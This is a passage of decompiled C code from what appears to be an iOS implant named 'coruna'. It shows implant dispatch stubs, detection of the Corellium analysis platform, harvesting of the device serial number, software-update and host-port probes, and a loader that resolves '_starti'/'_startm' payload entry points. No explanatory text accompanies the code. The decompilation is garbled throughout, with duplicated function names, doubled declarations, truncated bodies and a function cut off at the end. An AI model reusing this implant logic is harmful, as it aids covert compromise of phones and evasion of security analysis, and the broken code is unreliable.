  if (((handle != 0) && (*(long *)(handle + 8) != 0 && addr_2 != 0)) &&
     (indirect_target = *(void (**)(addr_2 + 0x28), indirect_target != (void (*)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
      indirect_target = *(void (**)(addr_2 + 0x28);
    }
    u = (*indirect_target)(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_50(long handle,uint64_t val,uint64_t *id_2,uint32_t *size)
{
  uint64_t u;
  long *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8),
     (ptr != (long *)0x0 && id_2 != (uint64_t *)0x0) && size != (uint32_t *)0x0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      bootargs = 0;
      scratch = 0;
      u = (**(void (**)(*ptr + 0x18))(*ptr,val,&bootargs,&scratch);
      if ((int)u == 0) {
        *id_2 = bootargs;
        *size = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_driver_copy_port_1918(long handle,uint64_t val,long addr_2,int flags)
{
  uint64_t u;
  long *ptr;
  
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8), (ptr != (long *)0x0 && addr_2 != 0) && flags != 0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      u = (**(void (**)(*ptr + 0x30))();
      return u;
    }
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_51(long handle,uint64_t *val,uint32_t *size)
{
  uint64_t u;
  long *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8),
     (ptr != (long *)0x0 && val != (uint64_t *)0x0) && size != (uint32_t *)0x0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      bootargs = 0;
      scratch = 0;
      u = (**(void (**)(*ptr + 0x20))(*ptr,&bootargs,&scratch);
      if ((int)u == 0) {
        *val = bootargs;
        *size = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_52(long handle,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && id_2 != (uint64_t *)0x0)
     ) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle == 0) {
      u = 0xad00a;
    }
    else {
      u = (**(void (**)(handle + 0x18))(handle,val,&scratch);
      if ((int)u == 0) {
        *id_2 = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_53(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x28))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_residual_54(long handle,long addr_2,long off_3,int flags)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8), ((handle != 0 && addr_2 != 0) && off_3 != 0) && flags != 0
     )) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x40))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_residual_55(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x30))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_via_macho_iface_create(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*(long *)(handle + 0x18) != 0) {
      u = coruna_macho_iface_create(*(long *)(handle + 0x18));
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint coruna_parse_xnu_release(long handle,size_t *len)
{
  mach_port_t host;
  uint u;
  int err;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  char host_info [520];
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if ((handle == 0) || (*(long *)(handle + 8) == 0 || len == (size_t *)0x0))
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
  return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_strncpy(long handle,char *path,uint *size)
{
  size_t ls1;
  long handle;
  uint64_t u;
  char *ptr;
  uint size;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && size != (uint *)0x0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x38);
    if (ptr == (char *)0x0) {
      size = 0;
    }
    else {
      ls1 = _strlen(ptr);
      size = (int)ls1 + 1;
      if (path != (char *)0x0) {
        if (*size < size) {
          return 0xad00c;
        }
        _strncpy(path,ptr,(unsigned long)*size);
      }
    }
    u = 0;
    *size = size;
  }
  return u;
}





uint64_t coruna_bzero_122f8(long handle)
{
  uint64_t u;
  size_t ls2;
  char *ptr;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x38);
    if (ptr == (char *)0x0) {
      u = 0;
    }
    else {
      ls2 = _strlen(ptr);
      _bzero(ptr,ls2);
      _free(*(void **)(handle + 0x38));
      u = 0;
      *(uint64_t *)(handle + 0x38) = 0;
    }
  }
  return u;
}





uint64_t coruna_strncpy_2(long handle,char *path,uint *size)
{
  size_t ls1;
  long handle;
  uint64_t u;
  char *ptr;
  uint size;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && size != (uint *)0x0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x48);
    if (ptr == (char *)0x0) {
      size = 0;
    }
    else {
      ls1 = _strlen(ptr);
      size = (int)ls1 + 1;
      if (path != (char *)0x0) {
        if (*size < size) {
          return 0xad00c;
        }
        _strncpy(path,ptr,(unsigned long)*size);
      }
    }
    u = 0;
    *size = size;
  }
  return u;
}





uint64_t coruna_bzero_1241c(long handle)
{
  uint64_t u;
  size_t ls2;
  char *ptr;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x48);
    if (ptr == (char *)0x0) {
      u = 0;
    }
    else {
      ls2 = _strlen(ptr);
      _bzero(ptr,ls2);
      _free(*(void **)(handle + 0x48));
      u = 0;
      *(uint64_t *)(handle + 0x48) = 0;
    }
  }
  return u;
}





uint64_t coruna_implant_residual_56(long handle,uint8_t *buf)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (*(long *)(handle + 8) != 0 && buf != (uint8_t *)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = 0;
    *buf = 1;
  }
  return u;
}





uint64_t coruna_implant_residual_57(long handle,char *path,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))(*(long *)(handle + 8),path,addr_2);
    return u;
  }
  return 0xad001;
}





unsigned long coruna_run_startm(long arg,uint64_t val)

{
  uint u;
  uint size;
  uint type_id;
  unsigned long version;
  long *block;
  uint cache_42;
  mach_port_name_t json_buf;
  uint cache_43;
  void *frame;
  uint32_t cache_44;
  uint64_t cache_45;
  
  version = 0xad001;
  if ((arg != 0) && (block = *(long **)(arg + 8), block != (long *)0x0)) {
    cache_45 = 0;
    cache_44 = 0;
    if ((char)block[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    version = (**(void (**)(*block + 0x18))(*block,0x80000,&cache_45,&cache_44);
    if ((int)version == 0) {
      frame = (void *)0x0;
      cache_43 = 0;
      version = (**(void (**)(*block + 0x20))(*block,&frame,&cache_43);
      if ((int)version == 0) {
        json_buf = 0;
        version = (**(void (**)(block[1] + 0x48))
                          (block[1],val,cache_45,cache_44,"_startm",frame,cache_43,0,
                           &json_buf);
        if ((int)version == 0) {
          cache_42 = 0xad000;
          type_id = (**(void (**)(block[1] + 0x58))(block[1],json_buf,2000,&cache_42);
          u = 0;
          if (type_id != 0x1e02a) {
            u = type_id;
          }
          size = cache_42;
          if (type_id != 0) {
            size = u;
          }
          version = (unsigned long)size;
          _mach_port_mod_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,json_buf,1,-1);
        }
        _bzero(frame,(unsigned long)cache_43);
        _free(frame);
      }
    }
  }
  return version;
}





void coruna_csops_12674(long handle,byte *arg)
{
  pid_t lp1;
  int err;
  uint u;
  int *err;
  uint *ptr;
  byte err;
  uint8_t scratch[3];
  byte bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint32_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  thread_attr = 0;
  scratch = 0;
  host_info = 0;
  u = 0xad001;
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
  return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_implant_via_check_softwareupdate(long handle,uint8_t *buf)
{
  uint64_t u;
  uint8_t scratch;
  
  u = 0xad001;
  if ((handle != 0) && (*(long *)(handle + 8) != 0 && buf != (uint8_t *)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    scratch = 0;
    u = coruna_check_softwareupdate(&scratch);
    if ((int)u == 0) {
      *buf = scratch;
    }
  }
  return u;
}





void coruna_implant_via_host_get_special_port(long handle,uint8_t *buf)
{
  uint64_t u;
  int *err;
  long handle;
  long addr;
  long off;
  uint scratch [2];
  int *bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if ((handle == 0) || (off = *(long *)(handle + 8), off == 0 || buf == (uint8_t *)0x0)
     if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
     return;
     }
     ___stack_chk_fail(u);
}





uint64_t
uint64_t coruna_implant_residual_58(int64_t arg,int flags,int64_t arg,int count_2,int64_t val,int64_t n,int fd_3 )
{
  uint64_t u;
  long handle;
  
  if (((arg == 0) ||
      (handle = *(long *)(arg + 8),
      ((((handle == 0 || flags == 0) || flags == -1) || arg == 0) || count_2 == 0) ||
      val == 0)) || ((n == 0) == (fd_3 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x40))();
  }
  return u;
}





uint64_t
uint64_t coruna_implant_residual_59(int64_t arg,int flags,int64_t arg,int count_2,int64_t val,int64_t n,int fd_3 )
{
  uint64_t u;
  long handle;
  
  if (((arg == 0) ||
      (handle = *(long *)(arg + 8),
      (((handle == 0 || flags < 1) || arg == 0) || count_2 == 0) || val == 0)) ||
     ((n == 0) == (fd_3 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x48))();
  }
  return u;
}





uint64_t
uint64_t coruna_implant_residual_60(int64_t arg,int64_t arg,uint64_t val,int64_t val,int flags,int64_t n, int64_t m,int count_2)
{
  uint64_t u;
  long handle;
  
  if (((arg == 0) ||
      (handle = *(long *)(arg + 8),
      (((handle == 0 || arg == 0) || val == 0) || flags == 0) || n == 0)) ||
     ((m == 0) == (count_2 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x50))();
  }
  return u;
}





uint64_t coruna_driver_copy_port_1918(long handle,int flags,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8),
     ((handle != 0 && flags != 0) && flags != -1) && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x58))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_61(long handle,char *path,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_62(long handle,char *path,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x60))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_run_starti(long handle)
{
  uint64_t *ptr;
  uint64_t *buf;
  short *lps3;
  uint64_t u;
  long handle;
  void (*scratch)(void);
  uint32_t bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint64_t block_ctx;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    block_ctx = 0;
    action = 0;
    u = (**(void (**)(handle + 0x68))(handle,0x30000,&block_ctx,&action);
    if ((int)u == 0x7003) {
      u = 0xad006;
    }
    else if ((int)u == 0) {
      if (*(long *)(handle + 0x18) == 0) {
        u = 0xad00a;
      }
      else {
        serial_buf = 0;
        host_info = 0;
        u = (**(void (**)(handle + 0x68))(handle,0x40000,&serial_buf,&host_info);
        if ((int)u == 0) {
          thread_attr = 0;
          bootargs = 0;
          u = (**(void (**)(handle + 0x68))(handle,0x90000,&thread_attr,&bootargs);
          if ((int)u == 0) {
            ptr = (uint64_t *)(handle + 0x28);
            u = (**(void (**)(handle + 0x50))(handle,block_ctx,action,ptr);
            if ((int)u == 0) {
              scratch = (void (*)0x0;
              u = (**(void (**)(handle + 0x58))(handle,*ptr,"_starti",&scratch);
              if ((int)u == 0) {
                buf = (uint64_t *)(handle + 0x30);
                u = (*scratch)(buf,serial_buf,host_info,thread_attr,bootargs,
                                    *(uint64_t *)(handle + 0x18),*(uint64_t *)(handle + 0x20));
                if ((int)u == 0) {
                  lps3 = (short *)*buf;
                  if (((lps3 != (short *)0x0) && (*lps3 == 4)) && (lps3[1] != 0)) {
                    return 0;
                  }
                  *buf = 0;
                  u = 0xad006;
                }
              }
              (**(void (**)(handle + 0x60))(handle,*ptr);
              *ptr = 0;
            }
          }
        }
      }
    }
  }
  return u;
}





uint64_t coruna_macho_iface_create(long handle,uint64_t *val)
{
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (val != (uint64_t *)0x0)) {
    ptr = _calloc(1,0x50);
    if (ptr == (uint32_t *)0x0) {
      u = 0xad009;
    }
    else {
      u = 0;
      *ptr = 0x20002;
      *(long *)(ptr + 2) = handle;
      ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_slot;
      ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_dyld_port_index;
      *val = ptr;
    }
  }
  return u;
}





uint64_t coruna_ctx_free_slot(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_free_ctx(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return 0;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x18))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x20))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x28))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x30))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x40))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_dyld_port_index(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x48))();
    return u;
  }
  return 0xad001;
}





uint coruna_check_softwareupdate(uint8_t *buf)
{
  bool err;
  int err;
  uint u;
  int *err;
  long handle;
  long addr;
  char *ptr;
  uint *ptr;
  stat scratch;
  
  if (buf == (uint8_t *)0x0) {
    return 0xad001;
  }
  scratch.st_gen = 0;
  scratch.st_lspare = 0;
  scratch.st_blksize = 0;
  scratch.st_flags = 0;
  scratch.st_qspare[1] = 0;
  scratch.st_qspare[0] = 0;
  scratch.st_birthtimespec.tv_nsec = 0;
  scratch.st_birthtimespec.tv_sec = 0;
  scratch.st_blocks = 0;
  scratch.st_size = 0;
  scratch.st_mtimespec.tv_nsec = 0;
  scratch.st_mtimespec.tv_sec = 0;
  scratch.st_ctimespec.tv_nsec = 0;
  scratch.st_ctimespec.tv_sec = 0;
  scratch.st_rdev = 0;
  scratch = 0;
  scratch.st_uid = 0;
  scratch.st_gid = 0;
  scratch.st_atimespec.tv_nsec = 0;
  scratch.st_atimespec.tv_sec = 0;
  scratch.st_ino = 0;
  scratch.st_dev = 0;
  scratch.st_mode = 0;
  scratch.st_nlink = 0;
  err = _lstat("/private/var/MobileSoftwareUpdate/Update.plist",&scratch);
  if (err == 0) {
    *buf = 1;
    return 0;
  }
  err = ___error();
  if (*err == 2) {
    handle = _opendir("/private/var/MobileSoftwareUpdate/");
    if (handle == 0) {
      err = ___error();
      if (*err != 2) goto fail;
      err = false;
    }
    else {
      do {
        addr = _readdir(handle);
        if (addr == 0) break;
        ptr = _strstr((char *)(addr + 0x15),"softwareupdate.");
      } while ((char *)(addr + 0x15) != ptr);
      err = addr != 0;
      _closedir(handle);
    }
    u = 0;
    *buf = err;
  }
  else {
fail:
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_host_get_special_port(host_priv_t arg,long handle)
{
  bool err;
  uint u;
  uint size;
  long handle;
  bool status;
  mach_port_t scratch;
  
  if (arg + 1 < 2 || handle == 0) {
    size = 0xad001;
  }
  else {
    handle = 0;
    scratch = 0;
    err = true;
    do {
      status = err;
      u = _host_get_special_port(arg,-1,(&k_implant_rodata_word_26a60)[handle],&scratch);
      if (u != 0) {
        return u | 0x80000000;
      }
      u = scratch + 1;
      if (1 < u) {
        _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
        break;
      }
      handle = 1;
      err = false;
    } while (status);
    size = 0;
    *(bool *)handle = 1 < u;
  }
  return size;
}





void coruna_get_platform_serial(long out_serial)
{
  bool err;
  bool status;
  int err;
  pid_t lp4;
  long handle;
  long addr;
  uint32_t *ptr;
  void (*ptr)(void);
  void (*buf)(void);
  void (*str)(void);
  uint64_t u;
  long off;
  long base;
  long ctx_val;
  long serial;
  uint size;
  unsigned long version;
  int status;
  uint64_t port;
  stat scratch;
  long bootargs;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  if (out_serial == 0) {
    u = 0xffffffff;
    if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
    }
    ___stack_chk_fail(u);
  }
  handle = coruna_identity(k_implant_get_cpu_capabilities_slot);
  version = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
  if (version == 0) {
    u = 0xfffffffe;
    if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
    }
    ___stack_chk_fail(u);
  }
  status = false;
  err = *(int *)(version + 0x80);
  if (err < 0x1b588bb3) {
    err = err == -0x789a1216;
    status = -0x25cc27c3;
  }
  else {
    err = err == 0x1b588bb3 || err == 0x462504d2;
    status = 0x2876f5b5;
  }
  if (err || err == status) {
    host_info = 0;
    thread_attr = 0;
    action = 0;
    serial_buf = 0;
    scratch = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    scratch.st_gen = 0;
    scratch.st_lspare = 0;
    scratch.st_blksize = 0;
    scratch.st_flags = 0;
    scratch.st_qspare[1] = 0;
    scratch.st_qspare[0] = 0;
    scratch.st_birthtimespec.tv_nsec = 0;
    scratch.st_birthtimespec.tv_sec = 0;
    scratch.st_blocks = 0;
    scratch.st_size = 0;
    scratch.st_mtimespec.tv_nsec = 0;
    scratch.st_mtimespec.tv_sec = 0;
    scratch.st_ctimespec.tv_nsec = 0;
    scratch.st_ctimespec.tv_sec = 0;
    scratch.st_rdev = 0;
    scratch = 0;
    scratch.st_uid = 0;
    scratch.st_gid = 0;
    scratch.st_atimespec.tv_nsec = 0;
    scratch.st_atimespec.tv_sec = 0;
    scratch.st_ino = 0;
    scratch.st_dev = 0;
    scratch.st_mode = 0;
    scratch.st_nlink = 0;
    err = _stat("/usr/libexec/corelliumd",&scratch);
    if (err == 0) {
      status = false;
    }
    else {
      lp4 = _getpid();
      err = _sandbox_check(lp4,"iokit-get-properties",
                             *(uint32_t *)k_implant_sandbox_check_no_report_slot);
      if ((err < 1) &&
         (addr = _dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit",1),
         addr != 0)) {
        ptr = (uint32_t *)_dlsym(addr,"kIOMasterPortDefault");
        ptr = (void (*)_dlsym(addr,"IORegistryEntryFromPath");
        buf = (void (*)_dlsym(addr,"IORegistryEntryCreateCFProperty");
        str = (void (*)_dlsym(addr,"IOObjectRelease");
        if (((ptr == (void (*)0x0) ||
            (((buf == (void (*)0x0 || (str == (void (*)0x0)) || (ptr == (uint32_t *)0x0)))
            ) || (u = (*ptr)(*ptr,"IODeviceTree:/"), (int)u == 0)) {
          _dlclose(addr);
        }
        else {
          port = *(uint64_t *)k_implant_kcfallocatordefault_slot;
          off = _CFStringCreateWithCString(port,"IOPlatformSerialNumber",0x8000100);
          if (off == 0) {
            err = -1;
          }
          else {
            base = (*buf)(u,off,port,0);
            if (base == 0) {
done:
              err = -1;
            }
            else {
              ctx_val = _CFStringGetTypeID();
              serial = _CFGetTypeID(base);
              if (ctx_val != serial) goto done;
              err = _CFStringGetCString(base,&bootargs,0x40,0x8000100);
              err = -(uint)(err == 0);
              _CFRelease(base);
            }
            _CFRelease(off);
          }
          (*str)(u);
          _dlclose(addr);
          addr = bootargs;
          if (err == 0) {
            version = scratch & 0xff;
            host_info = 0;
            thread_attr = 0;
            action = 0;
            serial_buf = 0;
            scratch = 0;
            bootargs = 0;
            thread_attr = 0;
            bootargs = 0;
            status = false;
            u = 0;
            *(bool *)out_serial = status;
            if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
            return;
            }
            ___stack_chk_fail(u);
          }
        }
      }
      version = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
      if (version == 0) {
        u = 0xfffffffd;
        if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
        return;
        }
        ___stack_chk_fail(u);
      }
      err = *(int *)(version + 0x80);
      if ((err == -0x6d04c838 || err == 0x37a09642) || err == 0x2c91a47e) {
        size = *(uint *)(version + 0x10) >> 0x1a & 1;
      }
      else {
        size = (uint)(*(short *)(version + 0x26) != 0x80);
      }
      status = size == 0;
    }
  }
cleanup:
  u = 0;
  *(bool *)out_serial = status;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t
uint64_t coruna_bind_loader_create(uint64_t *val,short *arg,uint64_t id_2,short *arg,uint64_t size_3 ,int flags)
{
  uint64_t *ptr;
  uint32_t *buf;
  uint64_t u;
  
  u = 0xad001;
  if (((val != (uint64_t *)0x0) &&
      ((arg == (short *)0x0 || ((*arg == 2 && (1 < (ushort)arg[1])))))) &&
     ((arg == (short *)0x0 || ((*arg == 1 && (arg[1] != 0)))))) {
    ptr = _calloc(1,0x20);
    if (ptr == (uint64_t *)0x0) {
      u = 0xad009;
    }
    else {
      ptr[1] = arg;
      ptr[2] = arg;
      u = coruna_load_libcache(ptr,arg,id_2,size_3);
      if ((int)u == 0) {
        if ((flags == 0) || (u = coruna_loader_init_shared_cache(ptr), (int)u == 0)) {
          buf = _calloc(1,0x70);
          if (buf != (uint32_t *)0x0) {
            *buf = 0x10003;
            *(uint64_t **)(buf + 2) = ptr;
            *(void (**)(buf + 4) = coruna_ctx_free;
            *(void (**)(buf + 6) = coruna_loader_bind_image;
            *(void (**)(buf + 8) = coruna_loader_teardown;
            *(void (**)(buf + 10) = coruna_loader_csops_check;
            *(void (**)(buf + 0xc) = coruna_loader_mach_send;
            *(void (**)(buf + 0xe) = coruna_realpath_if_mapped;
            *(void (**)(buf + 0x18) = coruna_call_realpath;
            *(void (**)(buf + 0x10) = coruna_call_pid_for_task;
            *(void (**)(buf + 0x12) = coruna_call_mach_port_deallocate;
            *(void (**)(buf + 0x14) = coruna_loader_verify_sig;
            *(void (**)(buf + 0x16) = coruna_call_mach_port_deallocate;
            *(void (**)(buf + 0x1a) = coruna_loader_iface_get;
            *val = buf;
            return 0;
          }
          u = 0xad009;
          if (ptr[3] != 0) {
            coruna_ctx_free();
            ptr[3] = 0;
          }
        }
        coruna_ctx_free(*ptr);
        *ptr = 0;
